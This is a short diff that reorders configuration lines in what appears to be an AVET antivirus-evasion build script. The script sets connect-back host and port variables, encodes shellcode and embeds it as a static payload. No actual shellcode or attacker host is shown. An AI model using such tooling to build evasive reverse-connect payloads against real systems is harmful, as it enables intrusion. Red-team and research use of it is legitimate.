@@ -26,6 +26,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -39,10 +42,6 @@ encode_payload avet input/sc_c.txt input/scenc_raw.txt
 
 # convert to c array format for static include
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/scenc_c.txt
